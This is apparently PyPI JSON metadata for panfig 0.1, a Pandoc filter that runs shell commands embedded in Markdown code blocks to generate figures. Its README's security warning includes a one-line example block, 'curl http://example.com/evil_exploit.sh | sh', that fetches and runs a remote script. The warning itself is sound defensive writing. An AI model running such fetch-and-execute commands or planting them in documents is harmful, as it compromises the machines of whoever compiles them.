{
  "info": {
    "author": "speezepearson",
    "author_email": "speeze.pearson+1098@gmail.com",
    "bugtrack_url": null,
    "classifiers": [
      "Development Status :: 3 - Alpha",
      "Programming Language :: Python :: 3",
      "Programming Language :: Python :: 3.2",
      "Programming Language :: Python :: 3.3",
      "Programming Language :: Python :: 3.4"
    ],
    "description": "Pandoc Figure Framework\n=======================\n\nThis library lets you write self-contained Pandoc/Markdown files that contain figures.\n\nWithout Panfig, if you want figures, you have to save the image files, and the scripts that generate them, alongside the document. You'd probably even have a Make system to ensure that all the figures were up to date. What a hassle!\n\nWith Panfig, the document stands alone. It describes how to generate the images, and they're generated when the document is compiled to HTML (or whatever).\n\nFor example, this Markdown code:\n\n    Here is a very simple FSM: the \"on-off automaton.\"\n\n    ~~~~~~~~ {.panfig shell=\"dot -Tpng -o {path}\"}\n      digraph G {\n        on [style=filled];\n        on -> off;\n        off -> on;\n      }\n    ~~~~~~~~\n\ngenerates HTML that looks like this:\n\n> Here is a very simple FSM: the \"on-off automaton.\"\n>\n> ![](on-off.png)\n\n\n\nSecurity: for God's sake, be careful.\n-------------------------------------\n\nI am putting this up near the top because you should care.\n**Panfig executes arbitrary code contained in the document being compiled. If you invoked Pandoc (+Panfig) on the following document, it would own your computer.**\n\n\n    ~~~~~~~~ { .panfig shell=\"curl http://example.com/evil_exploit.sh | sh\"}\n    ~~~~~~~~\n\n\nHow do I use it?\n----------------\n\nFirst things, of course, first: `pip install panfig`. (I don't actually have this on PyPI yet, so you'll have to download this and run `python setup.py` yourself.)\n\nIn general terms: where you want a figure, you write a code block that describes how to generate an image file. Then you compile the document with `pandoc --filter panfig ...`, and Panfig will generate the image and replace the code block with it.\n\nMore specifically: to make a figure, you use Pandoc/Markdown's fenced-code-block syntax to designate a code block as a Panfig block, by giving it the `.panfig` class, and also specifying a shell command that generates the image, like so:\n\n    ~~~~~~~~ { .panfig shell=\"dot -Tpng -o {path}\" }\n      digraph G {\n        on -> off;\n        off -> on;\n      }\n    ~~~~~~~~\n\nThe `sh` attribute, as you see, is a shell command. The contents of the block are piped to its standard input.\n\n\n### Aliases\n\nIf you get tired of writing the same command over and over, you can use aliases to make things more concise. For example:\n\n- Without aliases:\n\n        ~~~~~~~~ { .panfig shell=\"(cat; echo ''; echo 'Export[$CommandLine[[2]], %, \\\"png\\\"]') | MathKernel {path}\" }\n          Plot[Sin[x], {x, 0, 2*Pi}]\n        ~~~~~~~~\n\n- With aliases:\n\n        ~~~~~~~~ { .panfig-aliases }\n        {\"mma\": {\"shell\": \"(cat; echo ''; echo 'Export[$CommandLine[[2]], %, \\\"png\\\"]') | MathKernel {path}\"}}\n        ~~~~~~~~\n\n        ~~~~~~~~ { .panfig alias=mma }\n          Plot[Sin[x], {x, 0, 2*Pi}]\n        ~~~~~~~~",
    "docs_url": null,
    "download_url": "",
    "downloads": {
      "last_day": 0,
      "last_month": 0,
      "last_week": 0
    },
    "home_page": "https://github.com/speezepearson/panfig",
    "keywords": "pandoc pandocfilters",
    "license": "",
    "maintainer": "",
    "maintainer_email": "",
    "name": "panfig",
    "platform": "UNKNOWN",
    "project_url": "https://pypi.org/project/panfig/",
    "release_url": "https://pypi.org/project/panfig/0.1/",
    "requires_python": "",
    "summary": "A framework for describing figures in Pandoc documents",
    "version": "0.1"
  },
  "releases": {
    "0.1": [
      {
        "comment_text": "",
        "digests": {
          "md5": "ca5a1e78bb14efeda138fd6d8ada2aff",
          "sha256": "a01fd43421100ff0acf82ff435741df3afadc8f940fedf1fcb1710fc33a64cdc"
        },
        "downloads": 455,
        "filename": "panfig-0.1-py2.py3-none-any.whl",
        "has_sig": false,
        "md5_digest": "ca5a1e78bb14efeda138fd6d8ada2aff",
        "packagetype": "bdist_wheel",
        "python_version": "py2.py3",
        "size": 7258,
        "upload_time": "2016-06-26T16:23:33",
        "url": "https://files.pythonhosted.org/packages/ce/b5/98f66e8066bc6a651a1a3d0751ae8fb007e85939ad3374070627aba9366c/panfig-0.1-py2.py3-none-any.whl"
      }
    ]
  },
  "urls": [
    {
      "comment_text": "",
      "digests": {
        "md5": "ca5a1e78bb14efeda138fd6d8ada2aff",
        "sha256": "a01fd43421100ff0acf82ff435741df3afadc8f940fedf1fcb1710fc33a64cdc"
      },
      "downloads": 455,
      "filename": "panfig-0.1-py2.py3-none-any.whl",
      "has_sig": false,
      "md5_digest": "ca5a1e78bb14efeda138fd6d8ada2aff",
      "packagetype": "bdist_wheel",
      "python_version": "py2.py3",
      "size": 7258,
      "upload_time": "2016-06-26T16:23:33",
      "url": "https://files.pythonhosted.org/packages/ce/b5/98f66e8066bc6a651a1a3d0751ae8fb007e85939ad3374070627aba9366c/panfig-0.1-py2.py3-none-any.whl"
    }
  ]
}